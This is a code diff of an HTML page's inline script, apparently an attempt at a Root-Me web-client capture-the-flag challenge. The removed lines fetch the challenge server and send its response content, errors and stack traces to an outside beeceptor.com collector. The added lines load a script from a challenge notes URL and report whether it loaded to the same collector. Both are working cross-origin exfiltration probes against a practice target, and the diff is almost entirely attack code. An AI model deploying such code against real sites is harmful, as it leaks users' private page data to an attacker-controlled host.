@@ -4,20 +4,46 @@
 </head>
 <body>
 <script>
-fetch('https://web-client-ch56.challenge01.root-me.org:58056/')
-  .then(response => {
-    if (!response.ok) {
-      fetch(`https://rootmeleak2.free.beeceptor.com/error?status=${response.status}&statusText=${response.statusText}`);
-      throw new Error(`HTTP Error: ${response.status} - ${response.statusText}`);
-    }
-    return response.text(); // Ensure we return the response text for the next .then()
-  })
-  .then(data => {
-    fetch(`https://rootmeleak2.free.beeceptor.com/data?content=${encodeURIComponent(data)}`);
-  })
-  .catch(error => {
-    fetch(`https://rootmeleak2.free.beeceptor.com/catch?message=${encodeURIComponent(error.message)}&stack=${encodeURIComponent(error.stack)}`);
-  });
+// Create a new script element
+  const script = document.createElement('script');
+  
+  // Set the script src to the target URL
+  script.src = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/2278';
+  
+  // Define a success callback when the script loads
+  script.onload = function() {
+    // Query the web service when the script loads successfully
+    fetch('https://rootmeleak2.free.beeceptor.com/success?status=success')
+      .then(response => {
+        if (response.ok) {
+          console.log('Script loaded successfully and report sent');
+        } else {
+          console.log('Error sending report');
+        }
+      })
+      .catch(error => {
+        console.error('Network error or CORS issue:', error);
+      });
+  };
+  
+  // Define an error callback if the script fails to load
+  script.onerror = function() {
+    // Query the web service if the script fails to load
+    fetch('https://rootmeleak2.free.beeceptor.com/error?status=failed')
+      .then(response => {
+        if (response.ok) {
+          console.log('Error report sent');
+        } else {
+          console.log('Error sending report');
+        }
+      })
+      .catch(error => {
+        console.error('Network error or CORS issue:', error);
+      });
+  };
+  
+  // Append the script to the document body to start loading it
+  document.body.appendChild(script);
 
 
     /*
